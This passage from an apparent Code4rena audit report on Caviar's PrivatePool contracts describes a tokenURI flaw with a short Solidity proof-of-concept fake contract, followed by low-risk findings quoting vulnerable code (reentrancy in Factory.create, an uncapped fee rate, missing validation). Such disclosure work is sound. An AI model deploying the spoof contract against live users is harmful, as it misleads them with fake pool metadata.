href=\"https://github.com/code-423n4/2023-04-caviar/blob/cd8a92667bcb6657f70657183769c244d04c015c/src/PrivatePoolMetadata.sol#L17\">https://github.com/code-423n4/2023-04-caviar/blob/cd8a92667bcb6657f70657183769c244d04c015c/src/PrivatePoolMetadata.sol#L17</a></p>\n<h3 id=\"impact-7\" style=\"position:relative;\"><a href=\"#impact-7\" aria-label=\"impact 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<ul>\n<li>By invoking the <a href=\"https://github.com/code-423n4/2023-04-caviar/blob/cd8a92667bcb6657f70657183769c244d04c015c/src/Factory.sol#L161\">Factory.tokenURI</a> method for a maliciously provided NFT id, the returned data may deceive potential users, as the method will return data for a non-existent NFT id that appears to be a genuine PrivatePool. This can lead to a poor user experience or financial loss for users.</li>\n<li>Violation of the <a href=\"https://eips.ethereum.org/EIPS/eip-721\">ERC721-Metadata part</a> standard</li>\n</ul>\n<h3 id=\"proof-of-concept-16\" style=\"position:relative;\"><a href=\"#proof-of-concept-16\" aria-label=\"proof of concept 16 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<ul>\n<li>The <a href=\"https://github.com/code-423n4/2023-04-caviar/blob/cd8a92667bcb6657f70657183769c244d04c015c/src/Factory.sol#L161\">Factory.tokenURI</a> and <a href=\"https://github.com/code-423n4/2023-04-caviar/blob/cd8a92667bcb6657f70657183769c244d04c015c/src/PrivatePoolMetadata.sol#L17\">PrivatePoolMetadata.tokenURI</a> methods lack any requirements stating that the provided NFT id must be created. We can also see that in the standard implementation by <a href=\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/cf86fd9962701396457e50ab0d6cc78aa29a5ebc/contracts/token/ERC721/ERC721.sol#L94\">OpenZeppelin</a>, this check is present:</li>\n<li><a href=\"https://eips.ethereum.org/EIPS/eip-721\">Throws if <code>_tokenId</code> is not a valid NFT</a></li>\n</ul>\n<p><strong>Example</strong></p>\n<ol>\n<li>User creates a fake contract<br>\nA simple example so that the <code>tokenURI</code> method does not revert:</li>\n</ol>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"67\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// SPDX-License-Identifier: MIT</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> ^</span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">19</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">NFT</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">pure</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk7\">1</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">NonNFT</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">immutable</span><span class=\"mtk1\"> </span><span class=\"mtk12\">nft</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">constant</span><span class=\"mtk1\"> </span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">constant</span><span class=\"mtk1\"> </span><span class=\"mtk12\">virtualBaseTokenReserves</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">constant</span><span class=\"mtk1\"> </span><span class=\"mtk12\">virtualNftReserves</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">constant</span><span class=\"mtk1\"> </span><span class=\"mtk12\">feeRate</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">500</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">constructor</span><span class=\"mtk1\">() {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">nft</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">NFT</span><span class=\"mtk1\">());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<ol start=\"2\">\n<li>User deploy the contract</li>\n<li>Now, by using <code>tokenURI()</code> for the deployed user’s address, one can fetch information about a non-existent NFT.</li>\n</ol>\n<h3 id=\"tools-used-9\" style=\"position:relative;\"><a href=\"#tools-used-9\" aria-label=\"tools used 9 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<ul>\n<li>Manual review</li>\n<li>Foundry</li>\n</ul>\n<h3 id=\"recommended-mitigation-steps-19\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-19\" aria-label=\"recommended mitigation steps 19 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<ul>\n<li>Throw an error if the NFT id is invalid.</li>\n</ul>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/44#issuecomment-1518694046\">outdoteth (Caviar) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>Not sure if this should be medium or not.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/44#issuecomment-1525111686\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p><a href=\"https://eips.ethereum.org/EIPS/eip-721#:~:text=function%20tokenURI(uint256%20_tokenId)%20external%20view%20returns%20(string)%3B\">https://eips.ethereum.org/EIPS/eip-721#:~:text=function%20tokenURI(uint256%20_tokenId)%20external%20view%20returns%20(string)%3B</a></p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/44#issuecomment-1527230841\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Because the functionality breaks the EIP721 spec, I agree with Medium Severity, no funds are at risk.</p>\n</blockquote>\n<hr>\n<h1 id=\"low-risk-and-non-critical-issues\" style=\"position:relative;\"><a href=\"#low-risk-and-non-critical-issues\" aria-label=\"low risk and non critical issues permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Low Risk and Non-Critical Issues</h1>\n<p>For this audit, 20 reports were submitted by wardens detailing low risk and non-critical issues. The <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/624\">report highlighted below</a> by <strong>AkshaySrivastav</strong> received the top score from the judge.</p>\n<p><em>The following wardens also submitted reports: <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/960\">ulqiorra</a>,\n<a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/902\">rbserver</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/878\">adriro</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/874\">minhtrng</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/831\">nemveer</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/655\">devscrooge</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/543\">0x5rings</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/451\">0xbepresent</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/429\">ABA</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/409\">Bauchibred</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/354\">BenRai</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/326\">btk</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/291\">DadeKuma</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/284\">ElKu</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/258\">dingo2077</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/240\">Rolezn</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/220\">p0wd3r</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/215\">chaduke</a>, and <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/200\">RaymondFam</a>.</em></p>\n<h2 id=\"1-the-factorycreate-function-is-susceptible-to-re-entrancy-as-it-performs-a-_safemint-before-initializing-the-pool\" style=\"position:relative;\"><a href=\"#1-the-factorycreate-function-is-susceptible-to-re-entrancy-as-it-performs-a-_safemint-before-initializing-the-pool\" aria-label=\"1 the factorycreate function is susceptible to re entrancy as it performs a _safemint before initializing the pool permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[1] The <code>Factory.create</code> function is susceptible to re-entrancy as it performs a <code>_safeMint</code> before initializing the pool.</h2>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"68\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">```solidity</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">function create(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ...</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">) public payable returns (PrivatePool privatePool) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // ...</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    privatePool = PrivatePool(payable(privatePoolImplementation.cloneDeterministic(_salt)));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // mint the nft to the caller</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    _safeMint(msg.sender, uint256(uint160(address(privatePool))));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // initialize the pool</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    privatePool.initialize(...);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // ...</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">```</span></span></code></pre>\n<h2 id=\"2-the-factorycreate-function-performs-plain-transfer-of-funds-instead-of-calling-the-deposit-function-this-way-the-deposit-event-is-not-emitted\" style=\"position:relative;\"><a href=\"#2-the-factorycreate-function-performs-plain-transfer-of-funds-instead-of-calling-the-deposit-function-this-way-the-deposit-event-is-not-emitted\" aria-label=\"2 the factorycreate function performs plain transfer of funds instead of calling the deposit function this way the deposit event is not emitted permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[2] The <code>Factory.create</code> function performs plain transfer of funds instead of calling the <code>deposit</code> function. This way the <code>Deposit</code> event is not emitted.</h2>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"69\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">```solidity</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">function create(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ...</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">) public payable returns (PrivatePool privatePool) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // ...</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    privatePool.initialize(...);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    if (_baseToken == address(0)) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // transfer eth into the pool if base token is ETH</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address(privatePool).safeTransferETH(baseTokenAmount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    } else {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // deposit the base tokens from the caller into the pool</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        ERC20(_baseToken).transferFrom(msg.sender, address(privatePool), baseTokenAmount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // deposit the nfts from the caller into the pool</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    for (uint256 i = 0; i &lt; tokenIds.length; i++) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        ERC721(_nft).safeTransferFrom(msg.sender, address(privatePool), tokenIds[i]);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // emit create event</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    emit Create(address(privatePool), tokenIds, baseTokenAmount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">```</span></span></code></pre>\n<h2 id=\"3-there-is-no-fee-cap-on-the-factorysetprotocolfeerate-function-a-value-greater-then-10000-can-break-the-fee-calculations-in-private-pool-consider-validating-that-the-input-is-less-than-10000\" style=\"position:relative;\"><a href=\"#3-there-is-no-fee-cap-on-the-factorysetprotocolfeerate-function-a-value-greater-then-10000-can-break-the-fee-calculations-in-private-pool-consider-validating-that-the-input-is-less-than-10000\" aria-label=\"3 there is no fee cap on the factorysetprotocolfeerate function a value greater then 10000 can break the fee calculations in private pool consider validating that the input is less than 10000 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[3] There is no fee cap on the <code>Factory.setProtocolFeeRate</code> function. A value greater then 10000 can break the fee calculations in private pool. Consider validating that the input is less than 10000.</h2>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"70\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">```solidity</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">function setProtocolFeeRate(uint16 _protocolFeeRate) public onlyOwner {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    protocolFeeRate = _protocolFeeRate;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">```</span></span></code></pre>\n<h2 id=\"4-factorytokenid-does-not-validate-the-input-id-parameter-consider-validating-that-the-id-exist-and-the-respective-pool-is-created-by-the-factory\" style=\"position:relative;\"><a href=\"#4-factorytokenid-does-not-validate-the-input-id-parameter-consider-validating-that-the-id-exist-and-the-respective-pool-is-created-by-the-factory\" aria-label=\"4 factorytokenid does not validate the input id parameter consider validating that the id exist and the respective pool is created by the factory permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[4] <code>Factory.tokenId</code> does not validate the input <code>id</code> parameter. Consider validating that the <code>id</code> exist and the respective pool is created by the factory.</h2>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"71\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">```solidity</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">function tokenURI(uint256 id) public view override returns (string memory) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    return PrivatePoolMetadata(privatePoolMetadata).tokenURI(id);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">```</span></span></code></pre>\n<h2 id=\"5-once-initialization-is-done-the-privatepoolfeerate-variable-can-never-be-changed-consider-adding-an-owner-restricted-function-to-update-feerate\" style=\"position:relative;\"><a href=\"#5-once-initialization-is-done-the-privatepoolfeerate-variable-can-never-be-changed-consider-adding-an-owner-restricted-function-to-update-feerate\" aria-label=\"5 once initialization is done the privatepoolfeerate variable can never be changed consider adding an owner restricted function to update feerate permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[5] Once initialization is done the <code>PrivatePool.feeRate</code> variable can never be changed. Consider adding an <code>owner</code> restricted function to update <code>feeRate</code>.</h2>\n<h2 id=\"6-in-buy-and-sell-functions-consider-validating-that-the-length-of-all-input-arrays-are-equal-tokenids--tokenweights\" style=\"position:relative;\"><a href=\"#6-in-buy-and-sell-functions-consider-validating-that-the-length-of-all-input-arrays-are-equal-tokenids--tokenweights\" aria-label=\"6 in buy and sell functions consider validating that the length of all input arrays are equal tokenids  tokenweights permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[6] In <code>buy</code> and <code>sell</code> functions consider validating that the <code>length</code> of all input arrays are equal (<code>tokenIds</code> &#x26; <code>tokenWeights</code>).</h2>\n<h2 id=\"7-consider-adding-a-check-in-privatepoolsumweightsandvalidateproof-function-to-validate-that-every-element-of-tokenweights-array-is-greater-than-or-equal-to-1e18\" style=\"position:relative;\"><a href=\"#7-consider-adding-a-check-in-privatepoolsumweightsandvalidateproof-function-to-validate-that-every-element-of-tokenweights-array-is-greater-than-or-equal-to-1e18\" aria-label=\"7 consider adding a check in privatepoolsumweightsandvalidateproof function to validate that every element of tokenweights array is greater than or equal to 1e18 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[7] Consider adding a check in <code>PrivatePool.sumWeightsAndValidateProof</code> function to validate that every element of <code>tokenWeights</code> array is greater than or equal to <code>1e18</code>.</h2>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"72\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">```solidity</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">function sumWeightsAndValidateProof(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256[] memory tokenIds,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256[] memory tokenWeights,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    MerkleMultiProof memory proof</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">) public view returns (uint256) 